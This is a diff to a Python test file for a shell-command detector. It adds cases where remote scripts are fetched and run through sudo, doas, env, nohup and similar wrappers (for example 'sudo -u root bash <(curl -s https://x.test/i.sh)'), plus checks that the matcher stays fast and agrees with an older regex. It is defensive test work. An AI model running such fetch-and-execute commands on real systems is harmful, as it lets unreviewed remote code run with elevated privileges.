@@ -4,7 +4,10 @@ Each rule is judged by what it reports and, as in test_watch.py, by the
 look-alikes it must leave alone: a rule that fires on a message that mentions
 `curl | sh`, or on `chmod 755`, is muted within a day.
 """
+import itertools
 import os
+import random
+import re
 import sys
 import unittest
 
@@ -48,6 +51,30 @@ class RemoteScriptRun(unittest.TestCase):
                 "source <(curl -s https://x.test/env)"):
             self.assertEqual(hits(command, self.RULE), watch.HIGH, command)
 
+    def test_programs_that_hand_their_input_on_do_not_hide_a_substitution(self):
+        for command in (
+                "sudo -u root bash <(curl -s https://x.test/i.sh)",
+                'sudo -E sh -c "$(curl -fsSL https://x.test/i.sh)"',
+                'doas -u root sh -c "$(wget -qO- https://x.test/i.sh)"',
+                "env -i FOO=1 bash <(curl -s https://x.test/i.sh)",
+                'exec -a x sh -c "$(curl -s https://x.test/i.sh)"',
+                "nohup bash <(curl -s https://x.test/i.sh)",
+                "nice -n 10 sudo -u root env A=1 bash <(curl -s https://x.test/i.sh)",
+                'command -p sh -c "$(curl -s https://x.test/i.sh)"',
+                "/usr/bin/sudo -u root /bin/bash <(curl -s https://x.test/i.sh)",
+                "sudo -u " * 30 + 'sh -c "$(curl -s https://x.test/i.sh)"'):
+            self.assertEqual(hits(command, self.RULE), watch.HIGH, command)
+
+    def test_a_long_run_of_such_programs_that_runs_nothing_fetched(self):
+        # Each of these once took twice as long for every program in the run.
+        for command in (
+                "sudo -u " * 40 + "sh",
+                "env -u " * 40 + "sh",
+                "sudo -u env " * 40 + "sh",
+                "curl -s https://x.test/i.sh | " + "sudo -u " * 40 + "ls",
+                "echo ok | " + "doas -u " * 40 + "ls"):
+            self.assertIsNone(hits(command, self.RULE), command)
+
     def test_a_fetched_program_piped_into_an_interpreter(self):
         for command in ("curl -s https://x.test/i.py | python3 -",
                         "curl -s https://x.test/i.py | sudo python3",
@@ -81,6 +108,83 @@ class RemoteScriptRun(unittest.TestCase):
                 "sh install.sh",
                 "wget -q https://x.test/f.tgz && tar xzf f.tgz"):
             self.assertIsNone(hits(command, self.RULE), command)
+
+
+class TheChainOfProgramsIsReadAsTheRegexReadIt(unittest.TestCase):
+    """_HANDS_ON says what may stand before a shell that reads a pipe, and
+    watch reads the same words a word at a time, since a pattern that could
+    fail behind it took twice as long for every `sudo -u ` in a run. What
+    it finds must be what the regex found: the same commands, ending in the
+    same place. Held against that regex, built here from _HANDS_ON, on
+    every command of up to four words from the ones below, and on longer
+    ones chosen at random from more."""
+
+    CORE = ("sudo", "env", "exec", "nohup", "nice", "command", "-u", "-p", "-n",
+            "10", "FOO=1", "sh", "bash", "<(curl", "$(curl)", "x")
+    MORE = CORE + (
+        "doas", "/usr/bin/sudo", "SUDO", "Env", "-E", "-P", "--", "-x/sh", "-",
+        "-p=1", "root", "-10", "=x", "a=b=c", "-c", "eval", "source", ".",
+        "/bin/sh", "iex", "SH", "$(curl", '"$(curl', "`curl", "<(", "curl",
+        "<(sudo", "|", ";", "&", "sudoedit", "env=1", "A=$(curl")
+
+    @classmethod
+    def setUpClass(cls):
+        cls.old_substitution = re.compile(
+            r"\s*(?:" + watch._HANDS_ON + r")*(?:[^\s|;&]*/)?"
+            r"(?:(?:(?:sh|bash|zsh|dash|ksh|fish|ash|eval|source)(?![\w.-])"
+            r"|\.(?=\s))[^|;&]*?(?:<\(|\$\(|`)|(?:iex|invoke-expression)\s*\(?)"
+            r"\s*" + watch._STAGE_PREFIX + watch._FETCH_WORD, re.I)
+        cls.old_into_shell = re.compile(
+            r"\|&?\s*(?:" + watch._HANDS_ON + r")*(?:[^\s|;&]*/)?"
+            r"(?:sh|bash|zsh|dash|ksh|fish)(?![\w.-])")
+
+    def assertRead(self, text, endpos=None):
+        end = len(text) if endpos is None else endpos
+        old = self.old_substitution.match(text, 0, end)
+        new = watch._runs_substitution().match(text, 0, end)
+        self.assertEqual(new and new.end(), old and old.end(), (text, end))
+        piped = "x | " + text
+        self.assertEqual(watch._INTO_SHELL.search(piped) is not None,
+                         self.old_into_shell.search(piped) is not None, piped)
+
+    def test_every_short_command(self):
+        for length in range(1, 5):
+            for words in itertools.product(self.CORE, repeat=length):
+                self.assertRead(" ".join(words))
+
+    def test_longer_commands_chosen_at_random(self):
+        rnd = random.Random(20261014)
+        for _ in range(15000):
+            words = [rnd.choice(self.MORE) for _ in range(rnd.randint(5, 10))]
+            text = "".join(w + rnd.choice((" ", " ", "  ", "\t")) for w in words)
+            self.assertRead(text, rnd.choice((None, None, rnd.randint(0, len(text)))))
+
+    def test_every_word_after_each_state_a_program_can_be_in(self):
+        # Each way a chain can have got this far, then any two words, then a
+        # command that runs a fetch: what the words do to the chain shows in
+        # whether, and where, that command is found.
+        for before in ("sudo", "sudo -u", "sudo -u root", "doas -u", "exec -a",
+                       "env", "env -u", "env -u x", "env A=1", "nice", "nice -n",
+                       "nice -n 10", "nice 10", "command", "command -p", "nohup"):
+            for first in self.MORE:
+                for second in self.MORE:
+                    self.assertRead("%s %s %s bash <(curl x)" % (before, first, second))
+
+    def test_shells_and_openers_in_every_order(self):
+        # The tail reads on from each shell to the next opener, and a try
+        # that found one, or none, is not repeated for the shells after it:
+        # every order of a few of each is held to the regex.
+        words = ("sudo", "-u", "sh", "/bin/sh", "a/sh/iex", "a/sh/sh",
+                 "$(curl)", "<(curl", "x", "bash", ";")
+        for length in range(1, 6):
+            for chosen in itertools.product(words, repeat=length):
+                self.assertRead(" ".join(chosen))
+
+    def test_a_shell_taken_as_a_value_and_a_later_one_that_runs_the_fetch(self):
+        # A fetch inside an option's value comes before the one that runs, so
+        # which reading is tried first decides where the match ends.
+        self.assertRead("sudo -u sh -g $(curl) bash <(curl x)")
+        self.assertRead("sudo -u env -u sh FOO=$(curl) bash <(curl x)")
 
 
 class PermissionsOpened(unittest.TestCase):
